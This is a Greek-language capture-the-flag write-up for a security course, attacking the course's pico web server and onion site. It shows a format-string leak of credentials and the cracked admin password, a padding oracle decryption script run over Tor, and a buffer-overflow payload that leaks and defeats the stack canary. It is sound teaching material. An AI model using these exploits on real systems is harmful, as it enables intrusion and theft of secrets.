Έτσι, πήγαμε εδώ https://github.com/chatziko/pico, κατεβάσαμε τα αρχεία, στήσαμε τον server τοπικά και ξεκινήσαμε να κοιτάμε αναλυτικά τον κώδικα υποπτευόμενοι ότι θα έχει σχέση με buffer overflow. Αρχικά, το πρώτο πράγμα που παρατηρήσαμε όταν κάναμε make, ήταν το παρακάτω warning:
```
main.c:135:5: warning: format not a string literal and no format arguments [-Wformat-security]
     printf(auth_username);
```
Στην συγκεκριμένη printf δεν έχει οριστεί κάποιος τύπος για εκτύπωση. Επομένως, ξεκινήσαμε να αναζητάμε τρόπους για να το κάνουμε exploit, πέφτοντας στο εξής link για "Format String Exploit": https://nikhilh20.medium.com/format-string-exploit-ccefad8fd66b.

Συνεπώς, καταλάβαμε ότι η συγκεκιμένη printf αφού δεν συμπεριλαμβάνει τον τύπο της μεταβλητής που εκτυπώνεται κάθε φορά, μας δίνει την δυνατότα να δίνουμε όσους τύπους μεταβλητών θέλουμε, με αποτέλεσμα να διαβαστούν δεδομένα από την στοίβα.
Δοκιμάζοντας στην συνέχεια να σχηματίζουμε μια ακολουθία από %x και %s, γνωρίζοντας ότι:
```
Με το %x εκτυπώνονται τα δεδομένα της στοίβας και ταυτόχρονα μετακινείται ο stack pointer.
```
Προσπαθώντας στην ουσία να μαντέψουμε το πλήθων των %x που χρειάζονται μέχρι να εκτυπωθεί το
`<username>:<password-md5>` (εκτυπώνοντας στην ουσία τον πίνακα htpasswd).
Μετά από κάποιες δοκιμές καταλήξαμε στην εξής ακολουθία: `%x%x%x%x%x%x%s`.
Βεβαια, σημειώνουμε πως για να το κατεφέρουμε αυτό ήταν λίγο tricky, διότι 
έπρεπε κάθε φορά να σχηματίζουμε το link (με π.χ. .../?Username=%x%x%s) και
στο pop-up που εμφανιζόταν να πατάμε Cancel ώστε να στέλνετε κάθε φορά το αίτημα, πέρνοντας το αντίστοιχο response.
Έτσι, τελικά καταλήξαμε στο παρακάτω link:
http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/%3FUsername%3D%25x%25x%25x%25x%25x%25x%25s
(`http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/?Username=%x%x%x%x%x%x%s`)

Κοιτώντας στα response headers είχαμε λάβει ως response:
```
WWW-Authenticate: Basic realm="Invalid user: 57420310 1c 5657b511 f7c76d80 0 57410474admin:0fba1b57781369f0dcfb5b55e61764fd"
```
Δηλαδή, πετύχαμε αυτό που θέλαμε πέρνοντας το credential: `admin:0fba1b57781369f0dcfb5b55e61764fd`.
Τέλος, μέσω του https://www.md5online.org/md5-decrypt.html κάνουμε decode το MD5 password
και βρίσκουμε τον κωδικό: hammertime,
και κάνουμε Login με:
```
Username: admin
Password: hammertime
```
Στο home page μας περίμενε το FLAG={Stop! Hammer Time} συνοδευόμενο με το γνωστό κομματι `U Can't Touch This` του `M.C. Hammer` από τα μακρυνά nineties.



# Ερώτηση 4: Πού βρίσκονται τα αρχεία του "Plan X";

Στο onion site: http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion παρατηρούμε πως υπάρχει ένα encrypted μήνυμα, το οποίο εμείς πρέπει να αποκρυπτογραφίσουμε.

Έχοντας ήδη εγκαταστήσει τον pico server και παρατηρώντας την λειτουργία του εκτελέσιμου check-secret, αντιληφθήκαμε πως το “μυστικό” που ψάχνουμε βρίσκεται αποθηκευμένο (στην decrypted μορφή του) στο αρχείο secret.
Έτσι, η αρχική μας σκέψη ήταν να καταφέρουμε να βρούμε το περιεχόμενο του αρχείου αυτού. Αυτό, προσπαθήσαμε να επιτύχουμε μέσω buffer overflow. Πιο συγκεκριμένα:

  - Μέσω buffer overflow κάναμε overwrite το return address έτσι ώστε να καλέσουμε την συνάρτηση send_file του αρχείου main.c και να μας εκτυπώσει το περιεχόμενο του αρχείου αυτού. Ωστόσο, έχοντας επιτύχει το attack, η send_file δεν μας επέστρεφε τίποτα.
  - Έτσι, στην συνέχεια, ακολουθήσαμε την ίδια διαδικασία έτσι ώστε να καλέσουμε το library function “system()” με όρισμα “cat check-secret/secret”. Ωστόσο ούτε αυτό είχε αποτέλεσμα. Εκτελώντας την εντολή “ls -l check-secret/”, συνειδητοποιήσαμε πως δεν είχαμε τα δικαιώματα για την ανάγνωση του αρχείου καθώς τα είχε μόνο ο χρήστης “ubuntu”, ενώ η εκτέλεση της εντολής γινόταν από τον χρήστη “root”.

Έτσι, συνειδητοποιήσαμε ότι η εύρεση του περιεχομένου του αρχείου secret δεν είναι εφικτή. Τα δύο παραπάνω attacks περιγράφονται στην συνέχεια στα ερωτήματα 5 και 6 αντίστοιχα, καθώς χρησιμοποιήθηκαν για την λύση τους.

Στην συνέχεια, δώσαμε έμφαση στην λειτουργία που υπάρχει στο onion site, η οποία:
- Δέχεται ένα κρυπτογραφημένο μήνυμα και μας δίνει τις εξής πληροφορίες για το μήνυμα αυτό:
  - Αν το padding του κρυπτογραφημένου μηνύματος είναι σωστό ή όχι.
  - Σε περίπτωση που το padding είναι σωστό, αν το κρυπτογραφημένο μήνυμα είναι το ίδιο με αυτό που ψάχνουμε.

Επίσης, στο site αναφέρεται η εξής φράση: “*You can verify that the encrypted location you got is correct below (make sure you got a version with correct padding)*”.

Με βάση τα παραπάνω “στοιχεία” ξεκινήσαμε να αναζητούμε για πιθανά attacks που θα μπορούσαμε να εφαρμόσουμε. Έπειτα από αρκετή αναζήτηση, εμφανίστηκε μπροστά μας η σελίδα της Wikipedia σχετικά με τα [Padding oracle attacks](https://en.wikipedia.org/wiki/Padding_oracle_attack). Διαβάζοντας την πρώτη πρόταση της σελίδας καταλάβαμε πως πρόκειται για το attack που ψάχνουμε.

Έτσι, υλοποιήσαμε και εφαρμόσαμε ένα **Padding Oracle attack** για την αποκρυπτογράφηση του μηνύματος.

Για την επίτευξη του attack, υλοποιήσαμε το script: [q4_padding_oracle.py](https://github.com/chatziko-ys13/2022-project-2-angry-nerds/blob/master/q4/q4_padding_oracle.py)

Για την υλοποίηση του script (όσον αφορά τον αλγόριθμο τοy Padding Oracle Attack) βοηθηθήκαμε αρκετά από κάποια git repositories τα οποία υλοποιούσαν το attack αυτό.

Το παραπάνω script περιέχει:
-  Την συνάρτηση **poc** η οποία υλοποιεί την επαναληπτική διαδικασία για την αποκρυπτογράφηση του μηνύματος μέσω Padding Oracle Attack χρησιμοποιώντας ένα padding oracle.
- Την συνάρτηση **my_oracle** η οποία υλοποιεί το padding oracle. Πιο συγκεκριμένα:
  - Δέχεται σαν όρισμα ένα κρυπτογραφημένο μήνυμα
  - Εκτελεί ένα curl request στο onion site δίνοντας σαν payload το επιθυμητό αποκρυπτογραφημένο μήνυμα. Με βάση την απάντηση του onion site, επιστρέφει True ή False για το αν το padding του μηνύματος είναι σωστό ή όχι αντίστοιχα.
  - Λόγω των curl requests μέσω tor, πολλές φορές ο server δεν έδινε καμία απάντηση στο request. Έτσι έχει προστεθεί μια επαναληπτική διαδικασία, η οποία επαναλαμβάνει το request έως ότου αυτό είναι επιτυχές.

Συνοπτικά, η λειτουργία του script είναι:
-  Για κάθε ένα block του κρυπτογραφημένου μηνύματος (ξεκινώντας από το τελευταίο προς το πρώτο):
    - Για κάθε ένα byte αυτού του block (ξεκινώντας από το τελευταίο προς το πρώτο):
      - Βρίσκουμε την τιμή του byte, κάνοντας bruteforce για κάθε μια από τις 256 πιθανές τιμές. Δηλαδή αλλάζουμε κάθε φορά το συγκεκριμένο byte και “ρωτάμε” το padding oracle για το νέο encrypted message που προέκυψε από την αλλαγή του byte. Μόλις έχουμε θετική απάντηση από το padding oracle τότε εκτελούμε τις απαραίτητες πράξεις XOR σε όλα τα προηγούμενα bytes.

Αρχικά εκτελέσαμε το script στο pico server τον οποίο είχαμε στήσει τοπικά και το decryption ήταν επιτυχές.

Έτσι τροποποιήσαμε τα curl requests έτσι ώστε να στέλνονται στο onion site. Για να γίνει αυτό χρησιμοποιήσαμε το πρωτόκολλο SOCKS5 το οποίο χρησιμοποιεί το Tor. Έχοντας εγκαταστήσει το Tor στο μηχάνημα μας το default port είναι το **9050** (σε μηχάνημα Linux). Έτσι, αρκεί να προσθέσουμε στο curl request την εξής παράμετρο: ```--socks5-hostname localhost:9050```. Για παράδειγμα: ```curl --socks5-hostname localhost:9050 -v <tor_address>   <extra_headers>```.

Περισσότερες πληροφορίες για τον τρόπο που πραγματποιούνται τα requests στο tor (και για την διαδικασία εγκατάστασης) εξηγούνται στην παράγραφο [Curl Requests στο Tor](https://github.com/chatziko-ys13/2022-project-2-angry-nerds#curl-requests-%CF%83%CF%84%CE%BF-tor) της **Ερώτησης 5**.

Εκτελώντας το script, καταφέραμε να κάνουμε decrypt το μήνυμα. Το μήνυμα περιείχε το flag για το τέταρτο ερώτημα το οποίο ήταν: ```FLAG={/secet/x}```

*Παρατήρηση: λόγω των πολλών curl requests μέσω του tor, το script χρειάζεται πολύ χρόνο για να εκτελεστεί (περίπου 3 ώρες). Παρατηρήσαμε πως ορισμένες χρονικές στιγμές ο server αργούσε πολύ να “απαντήσει” το οποίο αυξάνει ακόμη περισσότερο τον χρόνο εκτέλεσης. Συγκεκριμένα χρειάστηκαν 3384 curl requests. Το αντίστοιχο script για το attack στον τοπικό pico server χρειάζεται μόλις 1-2 λεπτά για να εκτελεστεί.*

*Παρατήρηση 2: Το decrypted μήνυμα που εκτυπώνεται από το script περιέχει στην αρχή του κάποια “junk” bytes, τα οποία οφείλονται στο initialization vector το οποίο χρησιμοποιείται κατά το encryption. Ωστόσο, έπειτα από αυτά τα bytes υπάρχει κανονικά το αρχικό μήνυμα. Δηλαδή  Κατά την εκτέλεση του script εκτυπώνεται: ```b'\x99=\x1c\x1d\xd6\x17<\xac\x87<e\x7f\x07\xd0\x8d\xe3FLAG={/secet/x}'```*


# Ερώτηση 5: Ποια είναι τα results του "Plan Y";

Έχοντας σαν μοναδικό στοιχείο το flag που βρήκαμε στην ερώτηση 4, επόμενος μας στόχος ήταν να βρούμε τα περιεχόμενα του αρχείου ```/secet/x```.

## Εύρεση ευπάθειας

Η πρώτη μας σκέψη ήταν ότι αυτό μπορεί να επιτευχθεί μέσω κάποιου buffer overflow. Έχοντας στήσει τοπικά τον pico server (από το ερώτημα 3), ξεκινήσαμε να παρατηρούμε τόσο την λειτουργία του όσο και όλο τον κώδικα.

Έτσι, εντοπίσαμε το εξής κομμάτι κώδικα εσωτερικά της συνάρτησης **post_param** στο αρχείο **main.c**:
```c
char post_data[payload_size+1];     // dynamic size, to ensure it's big enough
strcpy(post_data, payload);
```
το οποίο αποτελεί ευπάθεια, δεδομένου ότι:
- Το **payload_size** προέρχεται από τον χρήστη μέσω του header ‘Content-Length: <user_input>’ στα requests που πραγματοποιούνταν από τον χρήστη.
- To **payload** προέρχεται επίσης από τον χρήστη και αποτελεί τα payload data του κάθε request.
- Το **payload_size** και **payload** είναι ανεξάρτητα μεταξύ τους, δηλαδή ο χρήστης μπορεί να πραγματοποιήσει ένα request με ‘Content-Length: 0’ (δηλαδή payload_size=0) και ταυτόχρονα το payload να είναι όσο μεγάλο θέλει.
- Τέλος, δεν υπάρχει πουθενά κάποιος έλεγχος στον κώδικα για τα παραπάνω.

Όπως φαίνεται στην γραμμή 50 του αρχείου main.c, η συνάρτηση post_param καλείται όταν πραγματοποιείται ένα post request στην σελίδα /check_secret.html, επομένως η επίθεση μας πρέπει να γίνει μέσω ενός τέτοιου post request.

## Στόχος

Με βάση τα παραπάνω, αντιληφθήκαμε πως ένα buffer overflow είναι εφικτό.

Επίσης, ψάχνοντας τον κώδικα εντοπίσαμε την ύπαρξη της συνάρτησης **send_file**. Η συνάρτηση αυτή δέχεται σαν όρισμα το path ενός αρχείου και επιστρέφει τα περιεχόμενα του.

Έτσι στόχος μας είναι μέσω buffer overflow να κληθεί η συνάρτηση send_file με όρισμα το path του αρχείου του οποίου θέλουμε να μάθουμε τα περιεχόμενα του.
Αναλυτικότερα, θέλουμε:
- Αρχικά, να κληθεί η συνάρτηση post_param.
- Έχοντας θέσει κατάλληλα τα payload_size και payload μέσω του post request, να πραγματοποιηθεί ένα buffer overflow.
- Μέσω του buffer overflow να κάνουμε overwrite το return address της συνάρτησης post_param, αντικαθιστώντας το με την διεύθυνση της συνάρτησης send_file.
- Ταυτόχρονα, μέσω του buffer overflow, να έχουμε αποθηκεύσει ένα string το οποίο περιέχει το path του αρχείου που θέλουμε να διαβάσουμε (δηλαδή: **/secet/x**) και να “δώσουμε” την διεύθυνση του σαν όρισμα στην συνάρτηση send_file.
- Τέλος, να κληθεί η συνάρτηση send_file με όρισμα το path του αρχείου, έτσι ώστε να εκτυπωθούν τα περιεχόμενα του. 

## Ανάλυση στοίβας

Επόμενο βήμα μας ήταν να αναλύσουμε την δομή της στοίβας κατά την κλίση της συνάρτησης post_param. Έτσι εκτελέσαμε μέσω του gdb τον pico server που είχαμε στήσει τοπικά.

Αρχικά έπρεπε να θέσουμε στον gdb να παρακολουθεί να νέα processes που δημιουργούνται μέσω fork, καθώς κάθε φορά που ο server λαμβάνει ένα νέο αίτημα δημιουργεί ένα νέο child process (μέσω fork) το οποίο διαχειρίζεται το αίτημα αυτό. Η λειτουργία αυτή ενεργοποιείται μέσω της εντολής ```set follow-fork-mode child```. Έχοντας τρέξει τον server μέσω του gdb στέλναμε ένα απλό POST request στο check-secret.html μέσω ενός curl request (αντίστοιχο με αυτό που στέλνεται από την λειτουργία που υπάρχει στο onion site, απλά στο localhost). Η μόνη διαφορά ήταν ότι θέταμε το header Content-Length ίσο με μηδέν, δηλαδή το curl request περιείχε: ```-H 'Content-Length: 0'```,  έτσι ώστε να μην γεμίζει η στοίβα από τον buffer.

Τέλος, θέσαμε ένα break point ακριβώς πριν την εκτέλεση της εντολής strcpy και αμέσως μετά την δήλωση του πίνακα post_data (δηλαδή στο main.c:177).

Έχοντας σταματήσει στο breakpoint, αρχικά βρίσκουμε την διεύθυνση του $ebp και του $esp
```
(gdb) x/a $ebp
 0xffffcf28:     0xffffcf68
(gdb) x/a $esp
 0xffffcee0:     0x56559186 <htpasswd+6>
```
Παρατηρούμε ότι ffffcf28 – ffffcee0 = 48 (σε δεκαδικό: 4294954792 – 4294954720 = 72) δηλαδή ότι ο $ebp έχει 18 (72/4) words διαφορά από τον $esp. Επίσης, γνωρίζουμε ότι το return address βρίσκεται ακριβώς μετά από τον $ebp, δηλαδή 19 words μετά τον $esp. Κάτι που επιβεβαιώνεται εκτελώντας:
```
(gdb) x/a $esp+76
 0xffffcf2c:     0x565561b8 <route+357>
```

Έτσι, θέλουμε να εκτυπώσουμε τον $esp και τα επόμενα 19 words από αυτόν (δηλαδή συνολικά 20 words). Εκτελούμε την εντολή ```x/20xw $esp``` και το output είναι το εξής:
```
(gdb) x/20xw $esp
0xffffcee0:     0x56559186      0x00000000      0x5656c310      0x565567ff
0xffffcef0:     0x5656c316      0x00000005      0x30ffcf58      0x5655742b
0xffffcf00:     0x37373562      0x36333138      0x64306639      0x35626663
0xffffcf10:     0x00000000      0xffffcee0      0x00646634      0x3c79c100
0xffffcf20:     0x56558f04      0xf7fcf000      0xffffcf68      0x565561b8
```
Στα παραπάνω 20 words έχουμε όλες τις χρήσιμες πληροφορίες για το attack μας. Τα παραπάνω words αντιστοιχούν:
```
(gdb) x/20xw $esp
0xffffcee0:     0x56559186      0x00000000      0x5656c310      0x565567ff
0xffffcef0:     0x5656c316      0x00000005      0x30ffcf58      0x5655742b
0xffffcf00:     0x37373562      0x36333138      0x64306639      0x35626663
0xffffcf10:     0x00000000      buffer_addr     0x00646634      canary
0xffffcf20:     0x56558f04      0xf7fcf000      epb_content     return_addr
```
Όπου:
- **buffer_addr**: η διεύθυνση του buffer μας (δηλαδή του πίνακα post_data), η οποία πρέπει να παραμείνει ίδια μετά το attack.
- **canary**: Το canary, το οποίο πρέπει να παραμείνει ίδιο μετά το attack.
- **ebp_content**: Το περιεχόμενο του $ebp, το οποίο πρέπει να παραμείνει ίδιο.
- **return_addr**: Το return address της συνάρτησης post_param, το οποίο θέλουμε να κάνουμε overwrite με το address της συνάρτησης send_file.

Όλα τα υπόλοιπα words δεν μας ενδιαφέρουν και δεν έχει σημασία το τι θα περιέχουν μετά το attack.

Επομένως το payload της επίθεσης μας πρέπει να έχει την εξής μορφή:
```
13 random words + buffer_addr + 1 random word + canary + 2 random words + ebp_content + address of send_file
```
Έτσι, επόμενος μας στόχος είναι:
- Να βρούμε έναν τρόπο να διατηρούμε σταθερά τα buffer_addr, canary και ebp_content
- Να βρούμε την διεύθυνση της send_file στον πραγματικό server (του onion site)

## Εύρεση πραγματικών διευθύνσεων

Για την εύρεση των διευθύνσεων που αναφέρθηκαν παραπάνω, χρησιμοποιήσαμε το Print Format Vulnerability που εντοπίσαμε στο ερώτημα 3.

Αρχικά, ακολουθήσαμε την ίδια διαδικασία με παραπάνω έτσι ώστε να αναλύσουμε την δομή της στοίβας κατά την κλήση της συνάρτησης check_auth.

Θέτοντας ένα breakpoint ακριβώς πριν την εκτέλεση της vulnerable printf (δηλαδή στο σημείο main.c:133), βρίσκουμε την διεύθυνση του $ebp και του $esp:
```
(gdb) x/a $ebp
 0xffffcf28:     0xffffcf68
(gdb) x/a $esp
 0xffffcec0:     0xf7d05d80
```
Παρατηρούμε ότι ffffcf28 – ffffcee0 = 68 (σε δεκαδικό: 44294954792 – 4294954688 = 104) δηλαδή ότι ο $ebp έχει 26 (104/4) words διαφορά από τον $esp. Επίσης, γνωρίζουμε ότι το return address βρίσκεται ακριβώς μετά από τον $ebp, δηλαδή 27 words μετά τον $esp. 

Αυτό επιβεβαιώνεται και αν εκτυπώσουμε τον $esp και τα επόμενα 27 words από αυτόν (δηλαδή συνολικά 28 words). Εκτελούμε την εντολή ```x/28xw $esp``` και το output είναι το εξής:
```
(gdb) x/28xw $esp
0xffffcec0:     0xf7d05d80      0x00000000      0x5655c47a      0x56559180
0xffffced0:     0xf7d05d80      0x00000000      0x5656c310      0x0000009a
0xffffcee0:     0x00000000      0x00000001      0x5656c310      0x00000000
0xffffcef0:     0x56557569      0x0000009a      0xffffcf58      0xf7b9dff2
0xffffcf00:     0xf7d05d80      0x00000000      0x00000000      0xf7b5f570
0xffffcf10:     0xf7b9dfd7      0xf7d03880      0xf7d05d80      0x24913800
0xffffcf20:     0xf7d05d80      0x56558f04      0xffffcf68      0x565560c2

(gdb) x/a $ebp+4
0xffffcf2c:     0x565560c2 <route+111>
```

Επομένως έπρεπε το input που θα δώσουμε στην printf να περιέχει 28 φορές το “%08x”. (Σε σχέση με το attack της ερώτησης 3, αντικαταστήσαμε το %x με %08x για καλύτερη εκτύπωση των διευθύνσεων).

Έτσι, εκτελέσαμε ένα curl request το οποίο περιείχε στο header Authorization: Basic 28 φορές το “%08x”, decoded σε base 64. Δηλαδή, περιείχε:
```
-H 'Authorization: Basic JTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eA=='
```
Ολόκληρο το curl request είναι:
```
curl --data-raw 'F' -v 'http://127.0.0.1:8000/check_secret.html' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 0' -H 'Authorization: Basic JTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eA==' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache'
```
Το response που πήραμε από τον server, μεταξύ άλλων, περιείχε:
```
WWW-Authenticate: Basic realm="Invalid user: 5656c310 0000009a 56556511 f7d05d80 00000000 5655c47a 56559180 f7d05d80 00000000 5656c310 0000009a 00000000 00000001 5656c310 00000000 56557569 0000009a ffffcf58 f7b9dff2 f7d05d80 00000000 00000000 f7b5f570 f7b9dfd7 f7d03880 f7d05d80 24913800 f7d05d80"
``` 
Παρατηρούμε πως στις παραπάνω διευθύνσεις δεν περιέχεται το return address της check_auth (όπως αναμέναμε). Αυτό ενδεχομένως να φταίει η κλήση της printf, κατά την οποία ίσως αλλάζει η δομή της στοίβας. Έτσι, εκτελέσαμε επαναλαμβανόμενα requests αυξάνοντας διαδοχικά το πλήθος των “%08x” κατά 1. Τελικά, χρειάζονται **31 “%08x”**, δηλαδή το αντίστοιχο base64 encoded string είναι:
```
Authorization: Basic JTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eA==
```
Το output που παίρνουμε είναι:
```
WWW-Authenticate: Basic realm="Invalid user: 5656c310 0000009a 56556511 f7d05d80 00000000 5655c47a 56559180 f7d05d80 00000000 5656c310 0000009a 00000000 00000001 5656c310 00000000 56557569 0000009a ffffcf58 f7b9dff2 f7d05d80 00000000 00000000 f7b5f570 f7b9dfd7 f7d03880 f7d05d80 24913800 f7d05d80 56558f04 ffffcf68 565560c2"
```
Στο οποίο περιέχονται οι εξής διευθύνσεις:
```
5656c310 0000009a 56556511 f7d05d80 00000000 5655c47a 
56559180 f7d05d80 00000000 5656c310 0000009a 00000000 
00000001 5656c310 00000000 56557569 0000009a ffffcf58 
f7b9dff2 f7d05d80 00000000 00000000 f7b5f570 f7b9dfd7 
f7d03880 f7d05d80 24913800 f7d05d80 56558f04 ffffcf68 565560c2
```
Έτσι, (συγκρίνοντας τα παραπάνω και με το output του gdb) εξάγουμε τις εξής πληροφορίες:
- Η 31η τιμή είναι το return address της συνάρτησης check_auth ```565560c2```.
- Η 30η τιμή είναι η τιμή του $ebp ```ffffcf68``` (η οποία είναι ίδια με την τιμή του $ebp εσωτερικά της post_param).
- Η 27η τιμή είναι η τιμή του canary ```24913800```

Όπως αναφέρθηκε στην προηγούμενη παράγραφο, στόχος μας είναι να βρούμε:
- Τις τιμές: buffer_addr, canary και ebp_content
- Την διεύθυνση της send_file στον πραγματικό server (του onion site)

Με βάση τα παραπάνω έχουμε ήδη βρει το canary και το ebp_content.

Για την εύρεση των άλλων δύο τιμών θα πρέπει να χρησιμοποιήσουμε κάποια από τις διευθύνσεις που βρήκαμε μέσω του Print Format Attack και να υπολογίσουμε τα κατάλληλα offsets (ελπίζοντας πως τα offsets θα είναι τα ίδια και στον πραγματικό server).

Έτσι αρχικά εντοπίζουμε στον τοπικό server την διεύθυνση του buffer (την οποία βέβαια έχουμε ήδη βρει παραπάνω) και της συνάρτησης send_file:
```
(gdb) x/a post_data
 0xffffcee0:     0x56559186 <htpasswd+6>
(gdb) info address send_file
 Symbol "send_file" is a function at address 0x56556735.
```
Παρατηρούμε ότι:
- Η διεύθυνση του buffer (post_data) είναι αρκετά κοντά με την τιμή του $ebp που βρήκαμε.
- Η διεύθυνση της συνάρτησης send_file είναι σχετικά κοντά με το return address της συνάρτησης check_auth (το οποίο επίσης βρήκαμε)

Έτσι υπολογίζουμε τα αντίστοιχα offsets. Για την διεύθυνση του buffer έχουμε:
```
ebp_content = 0xffffcf68
post_data_address = 0xffffcee0
Hexadecimal: post_data_address - ebp_content = 0xffffcee0 - 0xffffcf68 = -88
Decimal: post_data_address - ebp_content = 4294954720 - 4294954856 = -136
```
Δηλαδή ο buffer (post_data) έχει offset **-136** από την τιμή του $ebp. Με άλλα λόγια, αφαιρώντας 136 (στο δεκαδικό) από την τιμή του $ebp, παίρνουμε την διεύθυνση του buffer.

Για την διεύθυνση της συνάρτησης send_file έχουμε:
```
return_address = 0x565560c2  (της συνάρτησης check_auth)
send_file_address = 0x56556735
Hexadecimal: send_file_address - return_address = 0x56556735 - 0x565560c2 = 673
Decimal: send_file_address - return_address = 1448437557 - 1448435906 = 1651
```
Δηλαδή η διεύθυνση της συνάρτησης send_file έχει offset **1651** από το return address της συνάρτησης check_auth. Με άλλα λόγια, προσθέτοντας 1651 (στο δεκαδικό) στο return address της check_auth, παίρνουμε την διεύθυνση της συνάρτησης send_file.

Έτσι έχουμε καταφέρει να βρούμε και τις 4 τιμές/διευθύνσεις τις οποίες χρειαζόμαστε για το attack, εξάγοντας όλες τις απαραίτητες πληροφορίες από τον server στον οποίο θέλουμε να επιτεθούμε.

Πλέον, το μόνο που απομένει είναι να “περάσουμε” στην συνάρτηση send_file το όρισμα που επιθυμούμε (δηλαδή το string “/secet/x”).

## Προσθήκη ορίσματος στην συνάρτηση send_file

Έχοντας στο μυαλό μας την δομή της στοίβας και τις διαδικασίες που ακολουθούνται κατά την κλήση μιας συνάρτησης, αλλά και ψάχνοντας σε επιπλέον πηγές όπως [αυτή](https://security.stackexchange.com/questions/172053/how-to-pass-parameters-with-a-buffer-overflow), καταλήξαμε στα εξής:

Ενώ βρισκόμαστε εσωτερικά της post_param (και πριν γίνει η κλίση της send file)
- Το περιεχόμενο της αμέσως επόμενης διεύθυνσης από το return address (της συνάρτησης post_param) αντιστοιχεί στο return address της επόμενης συνάρτησης που θα κληθεί από το return (δηλαδή της send_file). Η διεύθυνση αυτή δεν μας ενδιαφέρει τι θα περιέχει καθώς αφού εκτελεστεί η send_file ο στόχος μας έχει επιτευχθεί.
- Το περιεχόμενο της αμέσως επόμενης διεύθυνσης αντιστοιχεί στην διεύθυνση του πρώτου ορίσματος της send_file (στην περίπτωση μας την διεύθυνση του string που θέλουμε να περάσουμε σαν όρισμα).

Αρχικά, πρέπει να αποθηκεύσουμε κάπου string μας, έτσι ώστε να αποθηκεύσουμε την διεύθυνσή του 2 words μετά το return address.

Έτσι, επιλέξαμε να αποθηκεύσουμε το string μας στην αρχή του payload που θα χρησιμοποιήσουμε για το attack μας. Δηλαδή, η διεύθυνση του string θα αντιστοιχεί στην διεύθυνση του buffer (post_data).

Όπως προαναφέρθηκε, το payload μας πρέπει να έχει την μορφή:
```
13 random words + buffer_addr + 1 random word + canary + 2 random words + ebp_content + address of send_file
```
Πλέον, εφόσον θα αποθηκεύσουμε το string μας στην αρχή του payload, αλλά και αφού πρέπει να αποθηκεύσουμε την διεύθυνση του string (δηλαδή την διεύθυνση του buffer) 2 words μετά το return address, το payload πρέπει να έχει την μορφή:
```
the string to pass as parameter + padding to fill 13 words + buffer_addr + 1 random word + canary + 2 random words + ebp_content + address of send_file + 1 random word + buffer_addr
```

Έχοντας ήδη την τιμή του buffer, το μόνο που απομένει είναι να “κατασκευάσουμε” σωστά το payload.

## Δημιουργία του payload

Ισχύουν τα εξής:
- Αρχικά δημιουργούμε το payload σε δεκαεξαδική μορφή. Κάθε word έχει 4 bytes, δηλαδή 8 χαρακτήρες.
- Για το padding χρησιμοποιούμε τον χαρακτήρα ‘F’. Δηλαδή, όταν χρειαζόμαστε ένα “random word” προσθέτουμε στο payload: “FFFFFFFF”.
- Λόγω της συνάρτησης strcpy το payload δεν πρέπει να περιέχει το byte ‘\0’  (στο δεκαεξαδικό: ’00’). Επίσης, παρατηρούμε πως στον κώδικα της συνάρτησης post_param (μετά την strcpy) αντικαθίστανται όλοι οι χαρακτήρες ‘=’ και ‘&’ με το ‘\0’. Επομένως, σε όποιο σημείο του payload θέλουμε να έχουμε το ‘\0’ μπορούμε να το αντικαταστήσουμε με το ‘=’ (και αντικατασταθεί μέσω του κώδικα σε ‘\0’). Στην δεκαεξαδική αναπαράσταση προσθέτουμε το payload το ’3D’, το οποίο αντιστοιχεί στον χαρακτήρα ‘=’.

Επίσης, όλες οι διευθύνσεις που γράφονται στο payload (π.χ. $ebp) είναι σε δεκαεξαδική μορφή. Ωστόσο πρέπει να τις μετατρέψουμε σε little endian. Για παράδειγμα, στο payload θέλουμε να προσθέσουμε αυτούσια την τιμή του $ebp που λάβαμε από το Print Format Attack. Έστω ότι η τιμή που βρήκαμε είναι: ```ffffcf68``` τότε εμείς πρέπει να προσθέσουμε στο payload ```68CFFFFF```.

Με βάση τα παραπάνω το payload μας αποτελείται από:
- Το string “/secet/x” σε δεκαεξαδική μορφή ( ```“/secet/x".encode("utf-8").hex()``` ), ακολουθούμενο από το ‘3D’ (δηλαδή ‘\0’)
- Το απαραίτητο padding έτσι ώστε να συμπληρωθούν 13 words. Πιο συγκεκριμένα το “/secet/x” αποτελείται από 8 χαρακτήρες + 1 για το ‘\0’. Αυτό αντιστοιχεί σε 18 δεκαεξαδικούς χαρακτήρες. Τα 13 words αποτελούνται από 52 bytes, δηλαδή 104 δεκαεξαδικούς χαρακτήρες. Άρα προσθέτουμε στο payload τον χαρακτήρα ‘F’ 104-18 = 84 φορές.
- Την διεύθυνση του buffer. 
- 1 random word, δηλαδή 8 χαρακτήρες ‘F’.
- To canary. 
- 2 random words, δηλαδή 16 χαρακτήρες ‘F’.
- Το περιεχόμενο του $ebp. 
- Το address της συνάρτησης send_file.
